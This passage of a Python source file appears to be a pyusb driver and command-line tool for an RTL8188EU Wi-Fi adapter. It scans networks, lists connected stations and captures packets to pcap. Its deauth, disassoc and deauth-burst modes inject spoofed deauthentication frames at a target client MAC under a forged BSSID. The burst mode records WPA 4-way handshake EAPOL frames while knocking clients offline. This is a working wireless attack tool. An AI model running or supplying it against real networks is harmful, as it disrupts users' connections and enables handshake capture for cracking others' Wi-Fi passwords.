        start = time.monotonic()
        end = None if duration_s <= 0 else (start + float(duration_s))
        next_send = start

        sent = 0
        tx_ok = 0
        tx_err = 0
        rx_reads = 0
        written = 0
        bssid_bytes = bytes.fromhex(bssid.replace(":", "").replace("-", ""))
        bssid_s = bssid.lower()
        stations: Dict[str, int] = {}
        next_status = start + 1.0

        while True:
            now = time.monotonic()
            if end is not None and now >= end:
                break

            if now >= next_send:
                for _ in range(burst_size):
                    sent += 1
                    if self.send_deauth(dest=dest, bssid=bssid, source=source, reason=reason):
                        tx_ok += 1
                    else:
                        tx_err += 1
                next_send += interval_ms / 1000.0
                if next_send < now:
                    next_send = now + (interval_ms / 1000.0)

            try:
                data = self.dev.read(self.ep_in, read_size, timeout=timeout_ms)
            except Exception:
                continue

            rx_reads += 1
            urb = bytes(data)
            for desc, payload in self.iter_rx_payloads(urb):
                if desc.rpt_sel != 0 or not payload:
                    continue
                if not include_bad_fcs and (desc.crc32 or desc.icverr):
                    continue
                if _fc_version(payload) != 0:
                    continue
                frame = payload
                try:
                    fc = int.from_bytes(frame[0:2], "little") if len(frame) >= 2 else 0
                    ftype = (fc >> 2) & 0x3
                    subtype = (fc >> 4) & 0xF

                    sta_mac: Optional[str] = None
                    frame_bssid: Optional[str] = None
                    if ftype == 2:
                        to_ds = bool((fc >> 8) & 0x1)
                        from_ds = bool((fc >> 9) & 0x1)
                        a1, a2, _a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(frame)
                        if not from_ds and to_ds:
                            if _is_unicast_mac(a1) and _is_unicast_mac(a2) and a1 != a2:
                                frame_bssid = _fmt_mac(a1)
                                sta_mac = _fmt_mac(a2)
                        elif from_ds and not to_ds:
                            if _is_unicast_mac(a2) and _is_unicast_mac(a1) and a1 != a2:
                                frame_bssid = _fmt_mac(a2)
                                sta_mac = _fmt_mac(a1)
                    elif ftype == 1 and subtype in (8, 10, 11):
                        if len(frame) >= 16:
                            ra = frame[4:10]
                            ta = frame[10:16]
                            ra_s = _fmt_mac(ra) if _is_unicast_mac(ra) else None
                            ta_s = _fmt_mac(ta) if _is_unicast_mac(ta) else None
                            if ra_s == bssid_s and ta_s is not None:
                                frame_bssid = ra_s
                                sta_mac = ta_s
                            elif ta_s == bssid_s and ra_s is not None:
                                frame_bssid = ta_s
                                sta_mac = ra_s
                    elif ftype == 0 and subtype in (0, 2, 10, 11, 12):
                        a1, a2, a3, _a4, _ftype2, _subtype2, _seq = _parse_addrs(frame)
                        a1_s = _fmt_mac(a1) if _is_unicast_mac(a1) else None
                        a2_s = _fmt_mac(a2) if _is_unicast_mac(a2) else None
                        a3_s = _fmt_mac(a3) if _is_unicast_mac(a3) else None
                        if a3_s == bssid_s:
                            frame_bssid = a3_s
                            if a2_s is not None and a2_s != bssid_s:
                                sta_mac = a2_s
                            elif a1_s is not None and a1_s != bssid_s:
                                sta_mac = a1_s

                    if frame_bssid == bssid_s and sta_mac:
                        prev = int(stations.get(sta_mac, 0))
                        stations[sta_mac] = prev + 1
                        if prev == 0:
                            sys.stdout.write(
                                f"ch={int(self.current_channel):02d} sta={sta_mac} bssid={bssid_s} seen=1\n"
                            )
                            sys.stdout.flush()
                except Exception:
                    pass
                has_fcs = False
                if desc.crc32 or desc.icverr:
                    pass
                elif keep_fcs:
                    _, has_fcs = _strip_fcs_if_present(payload)
                else:
                    frame, has_fcs = _strip_fcs_if_present(payload)
                flags: Optional[int] = None
                if keep_fcs:
                    flags_val = 0x10 if has_fcs else 0
                    if desc.crc32:
                        flags_val |= 0x40
                    flags = flags_val
                rtap = _radiotap_header(tsft=desc.tsfl, channel=self.current_channel, flags=flags)
                pcap.write_packet(rtap + frame)
                _print_4way_if_present(frame)
                info = _detect_4way_eapol(frame)
                if info is not None:
                    _msg, seen_bssid, _sta, _replay, _key_info = info
                    if seen_bssid == bssid_bytes:
                        next_send = max(next_send, now + 2.0)
                written += 1

            if self.tx_debug and now >= next_status:
                sys.stderr.write(
                    f"deauth-burst: sent={sent} ok={tx_ok} err={tx_err} rx_reads={rx_reads} pcap_written={written}\n"
                )
                next_status = now + 1.0

        pcap.flush()
        return sent, written


def find_device(vid: int, pid: int, *, usb_fd: Optional[int] = None):
    import usb.core

    if usb_fd is not None and int(usb_fd) >= 0:
        dev = _open_device_from_usb_fd(int(usb_fd))
        if int(getattr(dev, "idVendor", 0)) != int(vid) or int(getattr(dev, "idProduct", 0)) != int(pid):
            raise RuntimeError(
                f"USB FD device mismatch: got {int(getattr(dev, 'idVendor', 0)):04x}:{int(getattr(dev, 'idProduct', 0)):04x} "
                f"want {int(vid):04x}:{int(pid):04x}"
            )
        return dev
    return usb.core.find(idVendor=vid, idProduct=pid)


def resolve_firmware_path(arg: Optional[Path]) -> Optional[Path]:
    if arg is not None and arg.exists():
        return arg
    candidates = [
        Path(__file__).resolve().parent / "firmware" / "rtl8188eufw.bin",
        Path("/lib/firmware/rtlwifi/rtl8188eufw.bin"),
        Path("/usr/lib/firmware/rtlwifi/rtl8188eufw.bin"),
        Path("/lib/firmware/rtl8188eufw.bin"),
        Path("/usr/lib/firmware/rtl8188eufw.bin"),
    ]
    for p in candidates:
        if p.exists():
            return p
    return None


def main(argv: Sequence[str]) -> int:
    argv = list(argv)
    if argv:
        cmd = argv[0]
        if cmd == "scan":
            argv = ["--scan", *argv[1:]]
        elif cmd == "rx":
            argv = ["--rx", *argv[1:]]
        elif cmd == "deauth":
            argv = ["--deauth", *argv[1:]]
        elif cmd == "disassoc":
            argv = ["--disassoc", *argv[1:]]
        elif cmd == "deauth-burst":
            argv = ["--deauth-burst", *argv[1:]]
        elif cmd == "pcap":
            if len(argv) >= 2 and argv[1] != "-" and not str(argv[1]).startswith("-"):
                argv = ["--pcap", argv[1], *argv[2:]]
            else:
                argv = [*argv[1:]]

    for i, a in enumerate(list(argv)):
        if a == "--channels":
            argv[i] = "--scan-channels"
        elif a == "--station-scan-ms":
            argv[i] = "--station-scan-time"
        elif a == "--size":
            argv[i] = "--read-size"
    parser = argparse.ArgumentParser(prog="rtl8188eu_pyusb")
    parser.add_argument("--debug", action="store_true")
    parser.add_argument("--vid", type=lambda s: int(s, 0), default=0x2357)
    parser.add_argument("--pid", type=lambda s: int(s, 0), default=0x010C)
    parser.add_argument("--usb-fd", type=int, default=-1)
    parser.add_argument("--firmware", type=Path, default=None)
    parser.add_argument("--tables-from", type=Path, default=Path(__file__).resolve().parent / "firmware" / "rtl8xxxu_8188e.c")
    parser.add_argument("--channel", type=int, default=1)
    parser.add_argument("--bw", type=int, choices=(20, 40), default=20)
    parser.add_argument("--init-only", action="store_true")
    parser.add_argument("--rx", action="store_true")
    parser.add_argument("--scan", action="store_true")
    parser.add_argument("--target-ssid", type=str, default="")
    parser.add_argument("--scan-include-bad-fcs", action="store_true")
    parser.add_argument("--pcap", type=str, default="")
    parser.add_argument("--pcap-include-bad-fcs", action="store_true")
    parser.add_argument("--pcap-with-fcs", action="store_true")
    parser.add_argument("--scan-channels", type=str, default="1-11")
    parser.add_argument("--dwell-ms", type=int, default=200)
    parser.add_argument("--station-scan-time", type=int, default=5000, help="Time in ms to scan for stations when targeting a network")
    parser.add_argument("--reads", type=int, default=0)
    parser.add_argument("--read-size", type=int, default=16384)
    parser.add_argument("--timeout-ms", type=int, default=1000)
    parser.add_argument("--good-fcs-only", action="store_true")
    parser.add_argument("--dump-bytes", type=int, default=0)
    parser.add_argument("--disassoc", action="store_true", help="Send Disassociate frame")
    parser.add_argument("--deauth", action="store_true", help="Send Deauthentication frame")
    parser.add_argument("--deauth-burst", action="store_true", help="Send deauth bursts and capture to pcap")
    parser.add_argument("--target-mac", type=str, default="", help="Target MAC address (DA)")
    parser.add_argument("--bssid", type=str, default="", help="BSSID (and Source MAC by default)")
    parser.add_argument("--source-mac", type=str, default=None, help="Source MAC (SA) if different from BSSID")
    parser.add_argument("--reason", type=int, default=8, help="Reason code (default 8)")
    parser.add_argument("--count", type=int, default=1, help="Number of frames to send")
    parser.add_argument("--delay-ms", type=int, default=100, help="Delay between frames in ms")
    parser.add_argument("--burst-size", type=int, default=10, help="Frames per burst for --deauth-burst")
    parser.add_argument("--burst-interval-ms", type=int, default=1000, help="Delay between bursts for --deauth-burst")
    parser.add_argument("--burst-duration-s", type=float, default=0.0, help="Total run time for --deauth-burst (0 = until Ctrl-C)")
    parser.add_argument("--burst-read-timeout-ms", type=int, default=50, help="USB read timeout during --deauth-burst loop")
    parser.add_argument("--tx-debug", action="store_true")
    parser.add_argument("--tx-timeout-ms", type=int, default=100)
    parser.add_argument("--tx-dump-bytes", type=int, default=0)
    args, extra = parser.parse_known_args(argv)
    if extra:
        if (
            len(extra) == 1
            and extra[0] == argv[-1]
            and re.fullmatch(r"[0-9]+", extra[0]) is not None
            and int(getattr(args, "usb_fd", -1)) < 0
        ):
            usb_fd_auto = int(extra[0], 10)
            args = parser.parse_args(argv[:-1])
            args.usb_fd = usb_fd_auto
        else:
            parser.error("unrecognized arguments: " + " ".join(extra))

    try:
        import usb.core
        import usb.util
    except Exception as e:
        sys.stderr.write(f"pyusb not available: {e}\n")
        return 2

    usb_fd = int(getattr(args, "usb_fd", -1))
    dev = find_device(args.vid, args.pid, usb_fd=(usb_fd if usb_fd >= 0 else None))
    if dev is None:
        sys.stderr.write(f"USB device not found: vid=0x{args.vid:04x} pid=0x{args.pid:04x}\n")
        return 1

    firmware_path = resolve_firmware_path(args.firmware)
    if firmware_path is None:
        sys.stderr.write(
            "Firmware file not found. Provide --firmware or install rtl8188eufw.bin.\n"
        )
        return 1

    if not args.tables_from.exists():
        sys.stderr.write(f"Tables source not found: {args.tables_from}\n")
        return 1

    tables = load_tables_from_kernel_source(args.tables_from)
    chip = RTL8188EU(dev, tables=tables)
    try:
        chip.open()
        chip.init_device(firmware_path, channel=args.channel, bw=args.bw)
        chip.tx_debug = bool(args.tx_debug or args.debug)
        chip.tx_dump_bytes = int(args.tx_dump_bytes)
        chip.tx_timeout_ms = int(args.tx_timeout_ms)

        if args.debug:
            intf_num = chip.intf.bInterfaceNumber if chip.intf is not None else -1
            ep_in = chip.ep_in if chip.ep_in is not None else 0
            sys.stderr.write(f"USB: intf={intf_num} ep_in=0x{ep_in:02x} bulk_out={len(chip.bulk_out_eps)}")
            for i, ep in enumerate(chip.bulk_out_eps):
                sys.stderr.write(f" ep_out[{i}]=0x{int(ep):02x}")
            sys.stderr.write("\n")
        if args.init_only:
            return 0
        if args.deauth_burst:
            if not args.target_mac or not args.bssid:
                sys.stderr.write("Error: --target-mac and --bssid are required for --deauth-burst\n")
                return 1
            if not args.pcap:
                sys.stderr.write("Error: --pcap is required for --deauth-burst\n")
                return 1

            fp = sys.stdout.buffer if args.pcap == "-" else open(args.pcap, "wb")
            try:
                pcap = PcapWriter(fp)
                sent, written = 0, 0
                try:
                    sent, written = chip.deauth_burst_capture_pcap(
                        pcap=pcap,
                        dest=args.target_mac,
                        bssid=args.bssid,
                        source=args.source_mac,
                        reason=args.reason,
                        burst_size=args.burst_size,
                        interval_ms=args.burst_interval_ms,
                        duration_s=args.burst_duration_s,
                        read_size=args.read_size,
                        timeout_ms=args.burst_read_timeout_ms,
                        include_bad_fcs=args.pcap_include_bad_fcs,
                        keep_fcs=args.pcap_with_fcs,
                    )
                except KeyboardInterrupt:
                    pass
                pcap.flush()
            finally:
                if args.pcap != "-":
                    fp.close()

            sys.stdout.write(f"deauth_burst: sent={sent} pcap_written={written}\n")
            return 0
        if args.pcap:
            max_reads = None if args.reads == 0 else args.reads
            fp = sys.stdout.buffer if args.pcap == "-" else open(args.pcap, "wb")
            try:
                pcap = PcapWriter(fp)
                try:
                    chip.capture_pcap(
                        pcap=pcap,
                        max_reads=max_reads,
                        read_size=args.read_size,
                        timeout_ms=args.timeout_ms,
                        include_bad_fcs=args.pcap_include_bad_fcs,
                        keep_fcs=args.pcap_with_fcs,
                    )
                except KeyboardInterrupt:
                    pass
                pcap.flush()
            finally:
                if args.pcap != "-":
                    fp.close()
            return 0
        if args.scan:
            channels = _parse_channel_spec(args.scan_channels)
            if not channels:
                sys.stderr.write("No valid channels for --scan-channels\n")
                return 2
            def print_scan_results(res):
                rows = list(res.values())
                if args.target_ssid:
                    target = args.target_ssid.strip()
                    rows = [r for r in rows if str(r["ssid"]).strip() == target]
                rows.sort(key=lambda r: (int(r["channel"]), str(r["ssid"])))
                for r in rows:
                    ssid = r["ssid"]
                    if ssid == "":
                        ssid = "<hidden>"
                    enc = "OPEN"
                    if r.get("privacy"):
                        if r.get("wpa2"):
                            enc = "WPA2"
                        elif r.get("wpa"):
                            enc = "WPA"
                        else:
                            enc = "WEP"
                    sys.stdout.write(
                        f"ch={int(r['channel']):02d} bssid={r['bssid']} seen={int(r['seen'])} enc={enc} ssid={ssid}\n"
                    )
                sys.stdout.flush()

            forever = (not bool(args.target_ssid)) and (not sys.stdout.isatty())
            results = chip.scan_passive(
                channels=channels,
                dwell_ms=args.dwell_ms,
                read_size=args.read_size,
                timeout_ms=args.timeout_ms,
                good_fcs_only=args.good_fcs_only,
                include_bad_fcs=args.scan_include_bad_fcs,
                forever=forever,
                callback=print_scan_results if forever else None
            )
            if not forever:
                print_scan_results(results)

            if args.target_ssid:
                rows = list(results.values())
                if rows:
                    for r in rows:
                        bssid = str(r["bssid"])
                        channel = int(r["channel"])
                        ssid = str(r["ssid"]) or "<hidden>"
                        sys.stdout.write(
                            f"Scanning stations for SSID='{ssid}' BSSID={bssid} on channel {channel}...\n"
                        )
                        stations = chip.scan_stations(
                            bssid=bssid,
                            channel=channel,
                            duration_ms=args.station_scan_time,
                            read_size=args.read_size,
                            timeout_ms=args.timeout_ms,
                            good_fcs_only=args.good_fcs_only,
                            include_bad_fcs=True,
                        )
                        for sta in stations.values():
                            sys.stdout.write(f"  Station: {sta['mac']} seen={sta['seen']}\n")
                    sys.stdout.flush()
            return 0
        if args.disassoc or args.deauth:
            if not args.target_mac or not args.bssid:
                sys.stderr.write("Error: --target-mac and --bssid are required for disassoc/deauth\n")
                return 1
            
            action_name = "Disassociate" if args.disassoc else "Deauthentication"
            sys.stdout.write(f"Sending {action_name} to {args.target_mac} from {args.bssid} on channel {args.channel}...\n")
            
            for i in range(args.count):
                if args.disassoc:
                    chip.send_disassoc(
                        dest=args.target_mac,
                        bssid=args.bssid,
                        source=args.source_mac,
                        reason=args.reason
                    )
                else:
                    chip.send_deauth(
                        dest=args.target_mac,
                        bssid=args.bssid,
                        source=args.source_mac,
                        reason=args.reason
                    )
                if i < args.count - 1:
                    time.sleep(args.delay_ms / 1000.0)
            
            sys.stdout.write(f"Sent {args.count} {action_name} frames.\n")
            return 0
        if args.rx:
            max_reads = None if args.reads == 0 else args.reads
            chip.rx_loop(
                max_reads=max_reads,
                read_size=args.read_size,
                timeout_ms=args.timeout_ms,
                good_fcs_only=args.good_fcs_only,
                dump_bytes=args.dump_bytes,
            )
        return 0
    finally:
        chip.close()


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
